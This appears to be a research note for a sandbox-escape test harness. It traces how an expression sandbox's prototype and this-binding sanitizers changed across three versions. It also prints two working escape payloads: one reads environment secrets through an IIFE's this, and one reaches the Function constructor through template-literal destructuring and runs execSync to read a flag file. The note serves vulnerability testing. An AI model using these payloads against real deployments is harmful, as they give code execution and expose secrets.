Sanitizer evolution (verbatim from expression-sandboxing.ts at the three tags)
------------------------------------------------------------------------------
V0 (1.116.0): PrototypeSanitizer has ONLY visitMemberExpression (blocklist over
  constructor/__proto__/prototype on member access). NO FunctionThisSanitizer ->
  a non-strict regular-function IIFE has this === Node global.

V1 (1.119.0): + FunctionThisSanitizer (ASTBeforeHook) rewrites every called
  FunctionExpression to `.call({process:{}}, ...)` (IIFE) or `.bind({process:{}})`
  (callback) via EMPTY_CONTEXT = { process: {} }.  => the this-binding escape is
  blocked.  PrototypeSanitizer is UNCHANGED from V0 (still only
  visitMemberExpression) -- no visitObjectPattern, so destructuring is unchecked.

V2 (1.120.7): FunctionThisSanitizer renamed -> ThisSanitizer, gains
  visitIdentifier(globalThis -> {}) and visitThisExpression(this -> (0,{process:{}})).
  PrototypeSanitizer gains visitObjectPattern (+ visitVariableDeclarator,
  visitFunction, visitCatchClause, visitClass*, visitWithStatement):
      if (prop.computed) throw ExpressionComputedDestructuringError();
      ... Identifier/StringLiteral key -> isSafeObjectProperty() or
          throw ExpressionDestructuringError(keyName);
  => computed / TemplateLiteral destructuring keys AND plain unsafe keys blocked.

Expressions (the untrusted probe; only this varies)
---------------------------------------------------
ORIGINAL (CVE-2025-68613, this-binding):
  {{ (function(){ return this.process.env.PCB_FLAG })() }}

RESIDUAL (CVE-2026-25049, TemplateLiteral-key destructuring -> Function -> execSync):
  {{ (()=>{
       const {[`constructor`]: a} = Array;
       const {[`constructor`]: F} = a;
       return F("return process.mainModule.require('child_process')"
                + ".execSync('cat /canary/flag.txt').toString()")()
     })() }}

Canary: ${PCB_FLAG} injected via container ENV + planted at /canary/flag.txt by
the entrypoint (OUTSIDE app code); not on the sandbox `data` context. FLAG in
output <=> real process/Function reached == sandbox escaped. Benign: payload only
reads the planted token.

